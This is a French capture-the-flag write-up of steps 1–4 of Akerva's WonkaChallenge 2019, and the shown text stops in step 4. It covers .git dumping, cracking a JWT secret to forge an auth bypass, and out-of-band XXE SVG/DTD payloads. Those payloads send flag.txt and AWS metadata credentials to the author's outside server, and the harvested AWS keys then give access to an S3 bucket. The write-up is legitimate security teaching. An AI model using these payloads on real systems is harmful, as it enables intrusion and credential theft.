---
weight: 4
title: "[Akerva] - WonkaChallenge"
date: 2019-07-20T21:57:40+08:00
draft: false
author: "Maki"
authorLink: "https://www.maki.bzh"
description: ""
images: []
resources:
- name: "featured-image"
  src: "featured-image.png"

tags: ["akeva", "active directory", "pentest", "mimikatz", "pwn", "pentest", "cme", "web"]
categories: ["Writeups"]

lightgallery: true
---

## Introduction

Cette année, lors de l'évènement LeHack 2019, nous avons assisté au lancement de la seconde édition du __WonkaChallenge__ réalisé par [Akerva](https://akerva.com/). Lors de la première édition, nous pouvions nous confronter à un certain nombre d'épreuves,  d'abord des challenges web puis de l'Active Directory. Les writeups officiels de l'édition de l'année dernière se trouvent ici :

1. Williwonka.shop : https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/
2. Pramafil.com : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/
3. Compromission SI pramafil : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/
4. Compromission du domaine DEV : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/
5. Comme à la maison : https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/

Cette année, le WonkaChall a continué sur la même lancée et s'est étoffé d'une partie pwn et Linux à la fin. Cet article a pour but de présenter ma méthode de résolution des 13 épreuves. Akerva a aussi mis en ligne un writeup officiel, que vous pouvez retrouver ci-dessous :

1. Part 1 - WEB : https://akerva.com/blog/wonkachall-akerva-lehack-2019-write-up-part-1-web/
2. Part 2 - WINDOWS : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-2-windows/
3. Part 3 - LINUX : https://akerva.com/blog/wonkachall-2-lehack-2019-write-up-part-3-linux/

Cet article va se découper en 13 parties, une pour chaque flag à trouver. Mais avant d'entrer dans le vif du sujet, ci-dessous un schéma du réseau complet (attention, petit spoil :)) : 

![](/lib/images/writeups/2019_wonkachallenge/network_diagram_vm_nat.png)

Certaines épreuves nécessitent du Windows et d'autres du Linux, donc je switch entre ma Commando (Windows) et ma Kali (Linux). Ma configuration est plutôt simple, un hôte Windows 10 avec VMWare pro et les deux VM en NAT. Maintenant que tous les prérequis sont présentés, j'espère que la lecture vous sera agréable !

Le point d'entrée du challenge se trouve ici : https://willywonka.shop

![](https://media.giphy.com/media/3o7TKUM3IgJBX2as9O/giphy.gif)

## I. Step 1 - Erreur de développeur

> Let's start easy, what are the latest changes made to the website ?

### TL;DR

1. Utiliser dirsearch et trouver le dossier `.git` ;
2. Avec `GitTools -> dumper -> extractor`, récupérer le git et les anciens commits ;
3. Le premier flag se situe dans le fichier `.git/COMMIT_EDITMSG`.

---

### I.1. Directory listing


![](/lib/images/writeups/2019_wonkachallenge/step1_index.png)


La première chose que je fais en arrivant sur un site est lancer `dirsearch`. La wordlist par défaut est vraiment pertinente et en général, ce qu'elle sort se transforme en quick win :

```bash
(KaliVM) ➜ ./dirsearch.py -u https://willywonka.shop/ -e html,php,txt           

Extensions: .html, .php, .txt | HTTP method: get | Threads: 10 | Wordlist size: 6878

Target: https://willywonka.shop/

[01:29:23] Starting: 
[01:29:23] 400 -  166B  - /%2e%2e/google.com
[01:29:23] 308 -  263B  - /.git
[01:29:23] 200 -  973B  - /.git/
[01:29:23] 200 -  449B  - /.git/branches/
[01:29:23] 200 -  130B  - /.git/COMMIT_EDITMSG
[01:29:23] 200 -    1KB - /.git/hooks/
[01:29:23] 200 -  276B  - /.git/config
[01:29:23] 200 -  495B  - /.git/info/
[01:29:24] 200 -   73B  - /.git/description
[01:29:24] 200 -   23B  - /.git/HEAD
[01:29:24] 200 -  240B  - /.git/info/exclude
[01:29:24] 200 -  542B  - /.git/logs/
[01:29:24] 200 -    2KB - /.git/index
[01:29:24] 200 -  355B  - /.git/logs/HEAD
[01:29:24] 200 -  528B  - /.git/logs/refs/heads
[01:29:24] 200 -  355B  - /.git/logs/refs/heads/master
[01:29:24] 200 -  504B  - /.git/logs/refs
[01:29:24] 200 -    2KB - /.git/objects/
[01:29:24] 200 -   41B  - /.git/refs/heads/master
[01:29:24] 200 -  545B  - /.git/refs/
[01:29:24] 200 -  508B  - /.git/refs/heads
[01:29:24] 200 -  445B  - /.git/refs/tags
[01:29:35] 200 -    5KB - /login
[01:29:35] 302 -  209B  - /logout  ->  http://willywonka.shop/
[01:29:37] 500 -  290B  - /profile
[01:29:38] 200 -    4KB - /register
[01:29:38] 200 -    4KB - /reset
[01:29:39] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
```

On tombe sur un dossier `.git`. Même si ce genre de dossier affiche un beau "403 Forbidden", les fichiers sont souvent accessibles : 


![](/lib/images/writeups/2019_wonkachallenge/step1_git.png)


Il nous est donc possible de récupérer le contenu des anciens commits grâce à `GitTools`.

### I.2. Git dumping

Pour obtenir l'intégralité du `git`, on va d'abord utiliser le script `gitdumper.sh`, puis `extractor.sh` pour les différents commits.

```bash
(KaliVM) ➜ mkdir out_dump  
(KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ out_dump

[*] Destination folder does not exist
[+] Creating a/.git/
[+] Downloaded: HEAD
[...]

(KaliVM) ➜ mkdir out_extract
(KaliVM) ➜ /opt/t/pentest/exploit/GitTools/Extractor/extractor.sh out_dump out_extract                         

[+] Found commit: 8cda59381a6755d33425cb4ccddcc011a85649c6
[+] Found file: /home/maki/Documents/wonkachall2019/b/0-8cda59381a6755d33425cb4ccddcc011a85649c6/.env
[...]
[+] Found commit: 7a1756aae221342ab09f9101358201bbfa70a702
[+] Found file: /home/maki/Documents/wonkachall2019/b/1-7a1756aae221342ab09f9101358201bbfa70a702/.env
[...]
```

Il ne reste plus qu'à aller chercher le flag :

```bash
(KaliVM) ➜ cat out_dump/.git/COMMIT_EDITMSG 
Added debug mode with "debug=1" GET param

A wild flag appears !
16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009
```

### I.3. Flag

> 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009

---

### Ressources

1. __maurosoria__, _dirsearch_, GitHub : https://github.com/maurosoria/dirsearch 
2. __internetwache__, _GitTools_, GitHub : https://github.com/internetwache/GitTools

---
---

## II. Step 2 - Une histoire de JWT

>  A 'deadbeef' ticket was submitted. Who's the victim ? 

### TL;DR

1. Faire de l'audit de code grâce au `.git` trouvé dans l'étape d'avant, trouver le `debug=1` dans la configuration de Symphony ;
2. Mettre la page `/reset` en mode debug afin de récupérer une stacktrace : `https://willywonka.shop/reset?debug=1` ;
3. Dans la stacktrace ,trouver un sous-domaine (`backend.willywonka.shop`) et un JSON Web Token (JWT) ;
4. Il existe une autre page `/reset` sur le backend. Grâce à cette page, on sait que le site attend un JWT dans le cookie `backend-session` ;
5. L'analyse du JWT récupéré dans la stacktrace montre qu'il est protégé par une clé secrète (HS256) ;
6. Le bruteforcer avec `rockyou` et trouver la clé `s3cr3t` ;
7. Forger un nouveau token avec un utilisateur valide (`aas`) et une expiration lointaine, donnant la requête :`https://backend.willywonka.shop/reset/jwt_craft `. La liste des comptes se trouve sur la page d'accueil du frontend ;
8. Une fois la mire d'authentification passée, il ne reste qu'à chercher le ticket `deadbeef`.

---

### II.1. Directory listing

En enlevant les fichiers liés au `.git` du `dirsearch` précédent, il reste les pages suivantes :

```bash
[11:10:46] 200 -    5KB - /login
[11:10:47] 302 -  209B  - /logout  ->  http://willywonka.shop/
[11:10:51] 500 -  290B  - /profile
[11:10:52] 200 -    4KB - /register
[11:10:52] 200 -    4KB - /reset
[11:10:55] 302 -  265B  - /submit  ->  http://willywonka.shop/profile?filetype=image%2Fpng
```

### II.2. Enumération d'utilisateur

Lors de l'utilisation de l'application, on se rend compte qu'il est possible de faire de l'énumération d'utilisateur :


![](/lib/images/writeups/2019_wonkachallenge/step2_unable_to_find_user.png)


Pour tester cette théorie, j'ai choisi une liste d'utilisateurs provenant du GitHub SecList
. Elle est plutôt courte, donc rapide. L'intruder de Burp fait l'affaire pour ce test :


![](/lib/images/writeups/2019_wonkachallenge/step2_intruder.png)


Si un utilisateur valide est soumit à l'application, alors cette application renvoie... Une erreur 500. À savoir aussi que ce bruteforce d'utilisateur ne sert __à rien__ et m'a même fait perdre du temps par la suite. La liste des utilisateurs peut être trouvée sur l'index du site :


![](/lib/images/writeups/2019_wonkachallenge/step2_users_list_index.png)


Les utilisateurs sont donc :

* n0wait
* qsec
* cybiere
* meywa
* itm4n
* aas
* xXx_d4rkR0xx0r_xXx

### II.3. Ne pas oublier le .git

En regardant de plus près les sources obtenues dans le `.git` de l'étape 1, on remarque qu'il y a une histoire de debug. Une variable `/?debug=1` :

```bash
(KaliVM) ➜ cat 0-7a1756aae221342ab09f9101358201bbfa70a702/config/routes.yaml 
#index:
#    path: /
#    controller: App\Controller\DefaultController::index
debug:
    path: /?debug=1
    controller: #TODO#
```

N'étant pas familier avec Symphony, j'ai perdu du temps à comprendre pourquoi cette variable ne fonctionnait pas sur la route principale. Finalement, en plaçant un utilisateur valide (tel que `aas`) dans le formulaire de reset et en ajoutant le paramètre GET, le framework renvoie la stacktrace de l'application :


![](/lib/images/writeups/2019_wonkachallenge/step2_stacktrace.png)


> https://willywonka.shop/reset?debug=1

```json
Fatal error: Uncaught exception 'Swift_TransportException' with message 'Expected response code 354 but got code "566", with message "566 SMTP limit exceeded"' in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php:386

Stack trace:
#0 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(281): Swift_Transport_AbstractSmtpTransport->_assertResponseCode('566 SMTP limit ...', Array)
#1 /usr/local/lib/php/Swift/Transport/EsmtpTransport.php(245): Swift_Transport_AbstractSmtpTransport->executeCommand('DATA\r\n', Array, Array)
#2 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(321): Swift_Transport_EsmtpTransport->executeCommand('DATA\r\n', Array)
#3 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(432): Swift_Transport_AbstractSmtpTransport->_doDataCommand()
#4 /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php(449): Swift_Transport_AbstractSmtpTransport->_doMailTransaction(Object(Swift_Message), 'support@songboo...', Array, Array)
#5 /usr/local/lib/php/Swift/Transport/Abstra in /usr/local/lib/php/Swift/Transport/AbstractSmtpTransport.php on line 386

While trying to send:
{
    "dest":['test'],
    "object":'Password reset instructions for WillyWonka Shop',
    "from":'admin@wwonka.shop',"relay":'backend.willywonka.shop',
    "content-html":'
        <html>
            <head>
                <meta http-equiv="content-type" content="text/html; charset=UTF-8">
                <title></title>
            </head>
            <body text="#000000" bgcolor="#FFFFFF">
                <b>Hello dear associate,</b><br>
                <br>
                You are receiving this mail after a password reset request has been
                submitted on Willy Wonka Golden Ticket Shop. <br>
                <br>

                In order to reset your password, please use this login link and
                reset your password from your profile <br>
                <br>
                <i><font size="+3"><a moz-do-not-send="true"
                href="http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o">Reset my password</a></font></i><br>
                <br>
                <i><b>Note : if you didn't request this email, please ensure your
                account hasn't been accessed and perform any relevant security
                hardening.</b></i><br>
                <br>
                Have a nice day<br>
                <br>
                Willy Wonka<br>
                <a moz-do-not-send="true" href="http://willywonka.shop/">/</a><br>
            </body>
        </html>',
    "content-text":'
        Hello dear associate,
        
        You are receiving this mail after a password reset request has been submitted on Willy Wonka Golden Ticket Shop.
        
        In order to reset your password, please use this login link and reset your password from your profile
        
        http://willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
        
        Note : if you didn't request this email, please ensure your account hasn't been accessed and perform any relevant security hardening.
        
        Have a nice day
        
        Willy Wonka
        http://willywonka.shop/'
}

Find more documentation here :
https://google.fr
https://stackoverflow.com
https://lmgtfy.com
```

Cette trace divulgue des informations sensibles quant au SI de la cible :

```
* backend.willywonka.shop

* eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o
```

### II.4. Enumération web sur le backend

Nouveau site web, nouveau `dirsearch` : celui-ci renvoie énormément de `403`. Après un filtrage de qualité, le scan affiche des résultats pertinents :

```bash
(KaliVM) ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://backend.willywonka.shop -e php,html,txt,pdf,zip -t 25 | grep -v 403

Target: https://backend.willywonka.shop

[11:44:07] Starting: 
[11:44:07] 400 -  166B  - /%2e%2e/google.com
[11:44:32] 200 -    2KB - /login
[11:44:33] 302 -  219B  - /logout  ->  http://backend.willywonka.shop/login
[11:44:37] 302 -  219B  - /reset  ->  http://backend.willywonka.shop/login
```

Les résultats sont relativement équivalents aux résultats du frontend. Cependant, on remarque que toutes les pages du backend sont redirigées vers une page de `/login`. Cette page attend un JSON Web Token (JWT) :


![](/lib/images/writeups/2019_wonkachallenge/step2_backend_jwt.png)


Le token contient : 

> eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIk5vIHRva2VuIHByb3ZpZGVkIl19XX0.XSRiRw.QMJ9BsJX127QbsE-FgmcvQm-uBM

```json
{
  "_flashes": [
    {
      " t": [
        "message",
        "No token provided"
      ]
    }
  ]
}

{}
```

### II.5. Craquer le secret du JWT

En rassemblant les différents éléments du test d'intrusion, on remarque rapidement que la stacktrace du frontend délivre un JWT et que le cookie du backend en attend un. L'hypothèse la plus plausible est de récupérer le secret, modifier le JWT et signer le nouveau JWT. Ci-dessous le token de l'utilisateur `aas` :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2NDMxNSwiZXhwIjoxNTYyNjk0MzE1fQ.6yuVpu_jugKOZL9p9-M-wAF6knpArUJqnfgQzS4W9N4
```

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "aas",
  "aud": "frontend.willywonka.shop",
  "iat": 1563668653,
  "exp": 1563669253
}
```

Afin de créer un nouveau jeton fonctionnel, on modifie les éléments suivants : `aud` et `exp`. Le premier élément permet de sélectionner le bon domaine. Le second correspond à l'expiration du token, choisir une date suffisamment lointaine garantit la tranquillité. Modifier un JWT `HS256` est relativement simple. Il existe plusieurs outils efficaces, comme `jwt_tool`. En passant une wordlist pertinente en paramètre, cet outil peut bruteforce le secret du token :

```bash
(KaliVM) ➜ python ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0IiwiYXVkIjoiZnJvbnRlbmQud2lsbHl3b25rYS5zaG9wIiwiaWF0IjoxNTYyNjY0MzE1LCJleHAiOjE1NjI2NjQ5MTV9.UW7ZBlYilpv6g5oI-ryrnq1l00kfurcTbaG2FtSEU-o /opt/t/bf/rockyou.txt 

Token header values:
[+] typ = JWT
[+] alg = HS256

Token payload values:
[+] sub = test
[+] aud = frontend.willywonka.shop
[+] iat = 1562664315
[+] exp = 1562664915

######################################################
# Options:                                           #
# 1: Check CVE-2015-2951 - alg=None vulnerability    #
# 2: Check for Public Key bypass in RSA mode         #
# 3: Check signature against a key                   #
# 4: Check signature against a key file ("kid")      #
# 5: Crack signature with supplied dictionary file   #
# 6: Tamper with payload data (key required to sign) #
# 0: Quit                                            #
######################################################

Please make a selection (1-6)
> 5

Loading key dictionary...
File loaded: /opt/t/bf/rockyou.txt
Testing 14344380 passwords...
[+] s3cr3t is the CORRECT key!
```

Le secret a été cassé avec succès, il est possible de signer le nouveau jeton avec les paramètres suivants :

* aud : backend.willywonka.shop
* exp : 1999999999 -> Une date aux alentours de 2033


![](/lib/images/writeups/2019_wonkachallenge/step2_jwtcrafted.png)


Avec ce nouveau JWT, il est possible de passer outre l'authentification et d'accéder ainsi au backend de l'application :

```
https://backend.willywonka.shop/reset/eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhYXMiLCJhdWQiOiJiYWNrZW5kLndpbGx5d29ua2Euc2hvcCIsImlhdCI6MTU2MjY2OTkxMiwiZXhwIjoxOTk5OTk5OTk5fQ.pZxLNOIrI1DCRdB-MBWDNtDnmeKeANTNm5btAoY6Pmw
```

Conformément à l'énoncé, le flag se situe dans les données du ticket `deadbeef` :


![](/lib/images/writeups/2019_wonkachallenge/step2_auth_bypassed.png)


### II.6. Flag

> 7ED33F3EB8E49C5E4BE6B8E2AE270E4018582B27E030D32DE4111DB585EE0318

---

### Resources

1. __danielmiessler__, _SecLists - top-usernames-shortlist.txt_, GitHub : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
1. __Auth0__, _JSON Web Token debugger_, jwt : https://jwt.io/
2. __ticarpi__, _jwt\_tool_, GitHub : https://github.com/ticarpi/jwt_tool

---
---

## III. Step 3 - XXE Out-of-band

> There's a flag.txt at the server root 

![](/lib/images/writeups/2019_wonkachallenge/oob_xxe_dbz.png)

### TL;DR

1. Forger une XXE OOB via le fichier SVG ;
2. Uploader le fichier SVG à l'adresse : `http://willywonka.shop/profile?filetype=image%2fsvg%2bxml`, ne pas oublier de changer le MIME type ;
3. Remplir le formulaire avec `aas` en nom de victime et de la donnée random ;
4. Récupérer l'id du ticket et y accéder dans le backend ;
5. Cliquer sur `autoresize` pour déclencher la XXE OOB.

---

### III.1. Reconnaissance

La [plateforme](https://challenge.akerva.com) du challenge propose un hint par épreuve. Celui de cette épreuve énonce clairement qu'il s'agit d'une XXE via SVG. Le MIME type du fichier à envoyer est défini dans un paramètre GET, sur la page `submit` du __frontend__.

Il est possible pour un attaquant de changer ce MIME type et d'uploader ainsi un fichier SVG XML contenant la charge de la XXE. Lorsque le ticket est correctement uploadé, un identifiant est généré. Cet identifiant permet d'accéder au ticket dans le __backend__.


![](/lib/images/writeups/2019_wonkachallenge/step3_frontendform.png)


### III.2. Explication de l'exploitation

Par défaut, l'URL du __frontend__ accepte les images PNG : `https://frontend.willywonka.shop/profile?filetype=image%2Fpng`

Le mime-type est présent en paramètre GET, alors pour que l'application accepte les SVG XML il suffit de le changer : `image%2fsvg%2bxml`

Une XXE Out-of-band (OOB) est similaire à une XXE "classique", ou "in-band". Une OOB est une XXE à l'aveugle qui va charger un DTD distant. Les entités présentent dans ce DTD seront ensuite exécutées, permettant ainsi de forcer une extraction de données. Le schéma suivant devrait être plus parlant :


![](/lib/images/writeups/2019_wonkachallenge/step3_xxe_oob_nutshell.png)


Lors de CTF passés, j'ai déjà évoqué les XXE OOB : [Santhacklaus 2018](https://maki.bzh/walkthrough/santhacklaus2018/#archdrive-4-3). Dans cet article, le même serveur a été utilisé, mais il est aussi possible d'utiliser deux instances [ngrok](https://maki.bzh/stupidthings/dontpayvps/).

### III.3. Exploitation

Ci-dessous les fichiers nous permettant de mener à bien l'exploitation :

* ro.svg : le SVG XML contenant l'appel des entités externes du fichier DTD.

```xml
<!DOCTYPE svg [
<!ENTITY % file SYSTEM "http://51.158.113.8/ro.dtd">
%file;%template;
]>
<svg xmlns="http://www.w3.org/2000/svg">
    <text x="10" y="30">Injected: &res;</text>
</svg>
```

* ro.dtd : charge contenant les entités permettant de cibler un fichier et d'exfiltrer son contenu.

```xml
<!ENTITY % secret1 SYSTEM "file:///flag.txt">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

__Note__ : l'adresse IP utilisée (51.158.113.8) est un VPS temporaire de chez _Scaleway_ avec un __Python SimpleHTTPServer__ sur le port 80.

Lorsque l'environnement est correctement configuré, il ne reste qu'à uploader la charge via le formulaire sur le __frontend__ : 


![](/lib/images/writeups/2019_wonkachallenge/step3_frontend_form_filled.png)


En retour, le __frontend__ nous renvoie l'identifiant du ticket : _`e6afec4a`_. Le bouton __Autoresize__ de l'application en __backend__ appelle le parser XML vulnérable. C'est donc à ce moment que la charge est exécutée. 

__Note__ : on observe de l'activité sur les logs du __Python SimpleHTTPServer__.


![](/lib/images/writeups/2019_wonkachallenge/step3_flag.png)


Dans ce cas précis, ce n'est pas réellement une XXE OOB, car le retour s'affiche sur l'application (cf. Fig 13 - Ticket côté backend).

### III.4. Flag

> 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630

---

### Resources

1. __alexbirsan__, _LFI and SSRF via XXE in emblem editor_, HackerOne : https://hackerone.com/reports/347139
2. __Ian Muscat__, _Out-of-band XML External Entity (OOB-XXE)_, Acunetix : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/

---
---

## IV. Step 4 - SSRF to KFC

>  Lets check this bucket ! 

### TL;DR

1. La XXE OOB nous permet de récupérer les identifiants S3 Bucket à l'adresse suivante : `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
2. Les informations du bucket se situent ici : `http://169.254.169.254/latest/dynamic/instance-identity/document`
3. Initialiser les variables d'environnement avec les informations trouvées pour se connecter  : `AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN`
4. Lister le contenu du bucket : `aws s3 ls s3://willywonka-shop`
5. Récupérer le flag : `aws s3 cp s3://willywonka-shop/Flag-04.txt .`

---

### IV.1. Reconnaissance

Dû à la XXE OOB, il est possible de récupérer le contenu de certains fichiers. Cependant il faut connaitre son chemin et avoir les droits. En général, un attaquant essaiera de récupérer le fichier `/etc/passwd`, afin de récupérer les utilisateurs du système. Parfois, il arrive que le `.bash_history` de l'utilisateur courant soit accessible par tout le monde, c'est ce qu'il se passe dans notre cas :

```bash
[...]
sudo vim flag.txt
curl http://169.254.169.254/latest/meta-data/iam/iam/security-credentials/EC2toS3/ 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/  
[...]
```

Pour des raisons de lisibilité, j'ai tronqué le contenu du fichier pour ne garder que les quelques lignes intéressantes.

Revenons à notre XXE, jusqu'à présent seul le schéma `file://` a été utilisé. Amazon utilise le schéma `http://` pour récupérer les informations du bucket S3. Le `.bash_history` trouvé précédemment nous donne une de ces requêtes : `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/`

### IV.2. Exploitation

En remplaçant `file:///flag.txt` par `http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/` dans la charge __ro.dtd__, il est possible de récupérer les informations de connexion.

```xml
<!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2toS3/">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

```json
{
   "Code":"Success",
   "LastUpdated":"2019-07-10T14:45:25Z",
   "Type":"AWS-HMAC",
   "AccessKeyId":"ASIAZ47IG35A4F6ZY2ML",
   "SecretAccessKey":"bHrqaUNH3b+aGd4J4xWggq5eA0B1uWUK/8xQyhOn",
   "Token":"AgoJb3JpZ2luX2VjEDcaCWV1LXdlc3QtMyJIMEYCIQCclOqg51ncQQs4Xo6Ox8wqJ9vx7ritNzGavwTS/rI7oQIhAKHhe+WXRJ9A8dLuuunqa2NjyPCv+5/dIN9StNiRBx2yKt0DCJD//////////wEQABoMNjgwNzAyNDM1MTM3IgyHWN57wifuAe4thUgqsQMHVS0TSrUwnUusyltHD8RPZSgtTLPFEH4k0YUBo2lvHDYz5MQcvRh4RUw/+ZPjmMwHuDZd/AffNRdKjxr3AnnB8MVqKoPBnfCYkhm+JCRpnGaMcYWaGLZ45Dd0ljfd+KkqJ37VmAeTOqZ8pMsGoWxNtwOC+msVXp750tCHNEfRNO4o71+9BR7quq5VO9QSy1eSusZQTfdfA4cPsaEBGhR5cj7Eu1OXL1bsBoWbYAmBKfah+2cDs1FVGThQS7DcdpQ8KBMuLDeXrG7EtQNCiIuHPRuDYwoDfePJSXf7W/HIsIqfBAL1JH9jtmHgVmBP97/LfRKuL9BmT3V0UAYx0sxllW0d3kR0Rgy86zeMUaMu6NHIPr8DUmhQ80/dfrTgD2J+2OcUu/KtuwKJNUMSru12g7nzbN2zmJHPkH5bD16naiDm9AOkqRb2w2Y74r3T9oFidn8Rmo23nSwaLVPsDNal6CVA+VbnBR/Sv0gLXqIJyO95KHbXBgviYgXFj17QgnWFtbebSV2th8K8NGA1NPYMQaNes9+WNMBrv97yYmaKOHddw4u2BRjm9hGVLzJokQJHMNjzl+kFOrMBOd494LX2BWDzWFLKJqbWE09kCrZlkGP80If+mKxrV6saMDPPpWPgYnKkft8CgH7J/SMDOqkLHhwzkuIK+Mrt8CulbshV/K8v9CLWAbi303wblb69FYPa8xZsBAjORagjrfUVfXUC5EBSCWiL1mVYZCdU7Nu0gJlauV9MwSHde1iQkVaokruWs/dBd6QajFdseSnCgLvy+MX/oE+novoCwWG5oew2GxwA7ZZKUj4E5gGbPEA=",
   "Expiration":"2019-07-10T20:55:48Z"
}
```

Pour accéder au contenu d'un bucket S3, il faut différentes informations secrètes, mais aussi la zone du bucket :

```xml
<!ENTITY % secret1 SYSTEM "http://169.254.169.254/latest/dynamic/instance-identity/document">
<!ENTITY % template "<!ENTITY res SYSTEM 'http://51.158.113.8/?data=%secret1;'>">
```

```json
{
   "devpayProductCodes":null,
   "marketplaceProductCodes":null,
   "accountId":"680702435137",
   "availabilityZone":"eu-west-3c",
   "ramdiskId":null,
   "kernelId":null,
   "pendingTime":"2019-07-04T16:23:26Z",
   "architecture":"x86_64",
   "privateIp":"172.31.39.217",
   "version":"2017-09-30",
   "region":"eu-west-3",
   "imageId":"ami-0119667e27598718e",
   "billingProducts":null,
   "instanceId":"i-0defb90fb5aafe95b",
   "instanceType":"t2.medium"
}
```

Lorsque toutes ces informations sont réunies, en configurant les différentes variables d'environnement, il est possible de se connecter au bucket. 

### IV.3. Connexion au bucket s3

```bash
(KaliVM) ➜ export AWS_ACCESS_KEY_ID=ASIAZ47IG35A57E4JGVL
(KaliVM) ➜ export AWS_SECRET_ACCESS_KEY=44tVG3Dv0xhPslIR52Fwmk6Vo5iwmof/EEIQF3aQ
(KaliVM) ➜ export AWS_DEFAULT_REGION=eu-west-3
(KaliVM) ➜ export AWS_SESSION_TOKEN=AgoJb3JpZ2luX2VjEDkaCWV1LXdlc3QtMyJGMEQCIGmZTy1kpupPx9pOZGQ4d4pyTs0J/1NlHz4FBmd20XlOAiB6THoIFFw+wMoOQru3UoiEEzFybPv6Rr589TKaKGfjMSrdAwii//////////8BEAAaDDY4MDcwMjQzNTEzNyIMXgOibqCvChZ3RNFWKrED35t3r32Ff40kXU7sacZz1AB4V2KUQLQgBch26QfsJ8QW1WJcs21SnqtcJA6Fw5UxAmWk2PKrrIHRZcjmFH0dFsMnQ838ZY/HyPPhDdX60WZC5Czxect7sXkWDHLJK0ZQtSx3rT/TmANLoySZxD0DX5J+HNIISsmwaCx6omr/8TzpL7ZY2kXkWw/CLLYQIc/71NWO4IUOO+4Q9kdhwa1NzwX7CIoPQHG5ICX1i7Z3LnmuiLLsYgSxhY3Ne6TyIbt8gMHusVTAycltqjS5NcAxKstLrnqNMpYZ+WO4kwaKJSNCtLhb+cn98OihfsWECa3T9eaFcpqkGrhL8QkDgucb7XJNKiV7tkV8Qmp0ajtWLaBNqf0IBs1Xem/+H/KeRAMINVeNu6JXxD/5NjmjDo/umecpMlw3lXfX8Kd+LsXjKs2HDVr5QwLr+q8SF4W8vGFbq88U3blTXJ+jtvKpnOFB/QZy9cmEE/s5pD0PEc75VFnbGRcJYZjFzYQcttoW+YcjxaHHIpg41KWURYs9cV5TnAWViNAQk/CvP0Jj44zR7ixB/DHZW2Viw1+erIHLxWf8ZzDw1NDpBTq1AdGK7QkjqfH40mkHEcZBCaiKEl3CYU3G+jLsGkOeV9+m1254Yn3RWKlwISPbYFdg6W69jqvLd7wrtr1AU68rAl7LMZsiDCQGQ3gSSUOvNuQA9dVyZHd4gLptKgobAhDTt92dGI9553Tl5JwL2457IcJ0NtO2Nwa2AvoG1QUfxoSWg6nxJpFtexZyFm3rceEPHyXffuBsH+r3zuFUAklQ9/UYxLCMWi4Nq4ltYx99+Jd+R4aIYR4=

(KaliVM) ➜ aws s3 ls                                      
2019-07-04 18:41:42 willywonka-shop
```

La connexion étant établie, nous sommes en mesure de récupérer son contenu :

```
(KaliVM) ➜ aws s3 ls                      
2019-07-04 18:41:42 willywonka-shop

(KaliVM) ➜ aws s3 ls s3://willywonka-shop/
                           PRE images/
                           PRE tools/
2019-07-05 13:54:47         65 Flag-04.txt

(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools      
                           PRE tools/

(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/     
                           PRE docs/
                           PRE vpn/
2019-07-05 10:15:18          0 

(KaliVM) ➜ aws s3 ls s3://willywonka-shop/tools/docs/
2019-07-05 13:15:12          0 
